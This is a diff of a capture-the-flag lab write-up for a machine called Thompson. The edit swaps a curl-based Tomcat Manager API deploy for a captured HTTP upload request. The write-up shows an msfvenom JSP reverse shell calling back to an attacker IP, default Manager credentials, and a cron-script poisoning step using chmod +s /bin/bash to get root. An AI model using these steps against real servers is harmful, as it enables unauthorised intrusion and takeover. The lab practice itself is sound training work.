@@ -18,7 +18,7 @@
 | **Attack Surface** | Apache Tomcat Manager default credentials, WAR file deployment |
 | **Privesc** | World-writable cron script → SUID bash |
 
-Thompson exposes Apache Tomcat 8.5.5 with the Manager interface accessible via default credentials. A malicious WAR file containing a JSP reverse shell is uploaded through the Manager API, landing a shell as the `tomcat` service account. From there, a world-writable shell script in jack's home directory is executed periodically by a root-owned cron job — poisoning it with a `chmod +s /bin/bash` payload escalates to root via SUID bash.
+Thompson exposes Apache Tomcat 8.5.5 with the Manager interface accessible via default credentials. A malicious WAR file containing a JSP reverse shell is uploaded through the Manager UI, landing a shell as the `tomcat` service account. From there, a world-writable shell script in jack's home directory is executed periodically by a root-owned cron job — poisoning it with a `chmod +s /bin/bash` payload escalates to root via SUID bash.
 
 ---
 
@@ -58,15 +58,38 @@ Manager is fully accessible — deploy, undeploy, start, stop. WAR upload is the
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.204.251 LPORT=4444 -f war -o shell.war
 ```
 
-### Deploy via Manager API
+### Deploy via Manager UI
 
-```bash
-curl -u tomcat:s3cret \
-  http://thompson:8080/manager/text/deploy?path=/shell \
-  --upload-file shell.war
+WAR uploaded through the Manager web interface. The request is a multipart POST to `/manager/html/upload`, authenticated via HTTP Basic (`tomcat:s3cret` base64-encoded) and protected by a CSRF nonce embedded in both the URL and cookie session.
+
+```http
+POST /manager/html/upload;jsessionid=B7807BB4F00584EA67CD0772A1865481?org.apache.catalina.filters.CSRF_NONCE=393F7178AF96537CC7FA8A29DF3506D6 HTTP/1.1
+Host: thompson:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:149.0) Gecko/20100101 Firefox/149.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Content-Type: multipart/form-data; boundary=----geckoformboundary34cf6c8f465489198b18752de0b88c57
+Content-Length: 1323
+Authorization: Basic dG9tY2F0OnMzY3JldA==
+Cookie: JSESSIONID=B7807BB4F00584EA67CD0772A1865481
+Referer: http://thompson:8080/manager/html
+
+------geckoformboundary34cf6c8f465489198b18752de0b88c57
+Content-Disposition: form-data; name="deployWar"; filename="shell.war"
+Content-Type: application/octet-stream
+
+.. snipped ..
+------geckoformboundary34cf6c8f465489198b18752de0b88c57--
 ```
 
-The Manager text API (`/manager/text/`) accepts the WAR directly via PUT without CSRF tokens, bypassing the browser form entirely. Deployment succeeds with HTTP 200.
+```http
+HTTP/1.1 200
+Set-Cookie: JSESSIONID=EEDB733A5AA9CE5A7DE8A0D49D11BE2A;path=/manager;HttpOnly
+Content-Type: text/html;charset=utf-8
+Date: Wed, 15 Apr 2026 14:48:14 GMT
+Content-Length: 19893
+```
+
+HTTP 200 — Manager reloads with the newly deployed `/shell` application listed.
 
 ### Catch the Shell
 
@@ -201,9 +224,9 @@ cat /root/root.txt
     Default credentials: tomcat:s3cret
           │
           ▼
-[WAR File Upload via Manager API]
+[WAR File Upload via Manager UI]
     msfvenom JSP reverse shell → shell.war
-    curl PUT to /manager/text/deploy → HTTP 200
+    POST /manager/html/upload → HTTP 200
     Browse /shell/ → reverse shell as tomcat
           │
           ▼
@@ -229,7 +252,7 @@ cat /root/root.txt
 ## 📌 Key Takeaways
 
 - Default credentials on Tomcat Manager are a direct foothold — `tomcat:s3cret`, `admin:admin`, `manager:manager` should be the first thing checked on any Tomcat instance
-- The Manager text API (`/manager/text/`) bypasses CSRF controls on the HTML interface and is often overlooked — always check both endpoints
+- The Manager UI handles CSRF protection via nonce tokens, but once authenticated the WAR deploy flow is straightforward — just grab the nonce from the page source or intercept with Burp
 - World-writable scripts executed by root-owned cron jobs are an instant privilege escalation — `find / -writable -name "*.sh" 2>/dev/null` should be routine post-foothold
 - AJP on 8009 was present but unnecessary here; in other contexts (Ghostcat, CVE-2020-1938) it would be the primary attack vector
 - `watch -n 1 ls -lah /bin/bash` is a clean one-liner for confirming cron execution without spamming commands
